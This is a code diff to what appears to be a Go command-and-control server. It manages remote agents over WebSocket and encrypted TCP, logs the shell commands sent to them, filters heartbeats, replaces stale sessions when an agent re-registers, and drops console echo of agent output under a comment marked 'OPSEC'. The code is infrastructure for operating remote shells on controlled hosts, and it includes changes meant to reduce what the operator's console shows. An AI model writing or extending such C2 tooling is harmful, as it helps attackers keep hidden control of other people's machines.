@@ -74,6 +74,10 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 						log.Printf("Failed to send command to %s: %v", c.UUID, err)
 						return
 					}
+					// Log terminal command (Ignore empty heartbeats/pings)
+					if strings.TrimSpace(cmdStr) != "" {
+						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
+					}
 				}
 			}
 		}()
@@ -214,6 +218,11 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 			if client != nil && client.OutputChannel != nil {
 				// Persistence: Update Output Log
 				if resp.ReqID != "" {
+					// ⚡️ V3.0.1 Quiet Heartbeat: Ignore periodic survival pings
+					if resp.ReqID == "heartbeat" {
+						log.Printf("[C2 IO] WS Heartbeat received from %s", clientUUID)
+						continue
+					}
 					go func() {
 						store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
 					}()
@@ -322,21 +331,25 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 	defer func() {
 		close(done)
 		if clientUUID != "" {
-			globals.Clients.Delete(clientUUID)
-			store.UpdateAgentStatus(clientUUID, "offline")
-			log.Printf("Agent (Mapped TCP) Off: %s", clientUUID)
-			if client != nil {
-				NotifyAgentOffline(client.UUID, client.Hostname)
-			}
-			if client != nil && client.OutputChannel != nil {
-				close(client.OutputChannel)
+			// ⚡ SAFETY CHECK: Only delete if the client in the map is actually this specific instance.
+			// This prevents a stale/dying connection from removing a newer, active session for the same agent.
+			if val, ok := globals.Clients.Load(clientUUID); ok {
+				existingClient := val.(*globals.Client)
+				if existingClient == client {
+					globals.Clients.Delete(clientUUID)
+					store.UpdateAgentStatus(clientUUID, "offline")
+					log.Printf("Agent (Mapped TCP) Off: %s", clientUUID)
+					if client != nil {
+						NotifyAgentOffline(client.UUID, client.Hostname)
+					}
+					if client != nil && client.OutputChannel != nil {
+						close(client.OutputChannel)
+					}
+				}
 			}
 		}
 		conn.Close()
-		// If it's a multiplexed session, closing the stream doesn't close the session,
-		// but we might want to shut down the session if the control channel dies.
 		if session != nil {
-			// type assertion or use interface
 			if s, ok := session.(io.Closer); ok {
 				s.Close()
 			}
@@ -363,15 +376,21 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 					if err := WriteEncryptedMessage(c, msg); err != nil {
 						return
 					}
+					// Log terminal command (Ignore empty heartbeats/pings)
+					if strings.TrimSpace(cmdStr) != "" {
+						_ = store.CreateCommandLog(c.UUID, msg.Payload.(globals.CommandPayload).ReqID, "shell", cmdStr)
+					}
 				}
 			}
 		}()
 	}
 
+	log.Printf("[TCP] Starting message loop for %s", remoteAddr)
 	for {
 		// 1. Read Header (4 bytes length)
 		header := make([]byte, 4)
 		if _, err := io.ReadFull(conn, header); err != nil {
+			log.Printf("[TCP] Failed to read header from %s: %v", remoteAddr, err)
 			break
 		}
 		length := binary.BigEndian.Uint32(header)
@@ -437,6 +456,14 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			username, _ := p["username"].(string)
 			arch, _ := p["arch"].(string)
 
+			// 🚨 V3.0.1 Robustness: Close old connection if this agent is re-registering
+			if oldVal, ok := globals.Clients.Load(id); ok {
+				oldClient := oldVal.(*globals.Client)
+				log.Printf("[TCP] Agent %s re-registering (New IP: %s), clearing old session", id, remoteAddr)
+				if oldClient.TCPConn != nil { oldClient.TCPConn.Close() }
+				if oldClient.YamuxSession != nil { oldClient.YamuxSession.Close() }
+			}
+
 			// ⚡️ CRITICAL FIX: Upsert Agent to Database immediately
 			agentDBModel := &model.Agent{
 				UUID:      id,
@@ -498,10 +525,13 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 
 			if client != nil && client.OutputChannel != nil {
 				if resp.ReqID != "" {
+					// ⚡️ V3.0.1 Quiet Heartbeat: Ignore periodic survival pings in DB logs
+					if resp.ReqID == "heartbeat" {
+						log.Printf("[C2 IO] Heartbeat received from %s", clientUUID)
+						continue
+					}
 					go store.UpdateCommandOutput(resp.ReqID, resp.Stdout, resp.Stderr)
-					// ⚡ OPSEC: 移除 TCP 回显内容的控制台打印
-					// log.Printf("[C2 Output] Agent %s returned:\n%s\n%s", clientUUID, resp.Stdout, resp.Stderr)
-					log.Printf("[C2 IO] TCP Response received from Agent %s (ReqID: %s)", clientUUID, resp.ReqID)
+					log.Printf("[C2 IO] Response received from Agent %s (ReqID: %s)", clientUUID, resp.ReqID)
 				}
 				output := resp.Stdout
 				if output == "" && resp.Stderr != "" {
@@ -529,33 +559,6 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 
 // WriteEncryptedMessage is a helper to encrypt and send JSON messages to any transport
 func WriteEncryptedMessage(client *globals.Client, msg interface{}) error {
-	// Persist Command Log
-	if wrapper, ok := msg.(globals.MessageWrapper); ok {
-		if wrapper.MsgType == "command" {
-			// Try to inspect payload
-			if payload, ok := wrapper.Payload.(globals.CommandPayload); ok {
-				// Ensure ReqID exists for tracking/logging
-				if payload.ReqID == "" {
-					payload.ReqID = uuid.New().String()
-					wrapper.Payload = payload
-					msg = wrapper
-				}
-				// Record command
-				input := payload.CommandContent
-				if payload.CommandType == "file_upload" {
-					input = fmt.Sprintf("Upload %s", payload.Path)
-				} else if payload.CommandType == "file_download" {
-					input = fmt.Sprintf("Download %s", payload.Path)
-				}
-				
-				// Run in background to not block sending
-				go func() {
-					store.CreateCommandLog(client.UUID, payload.ReqID, payload.CommandType, input)
-				}()
-			}
-		}
-	}
-
 	data, err := json.Marshal(msg)
 	if err != nil {
 		return err
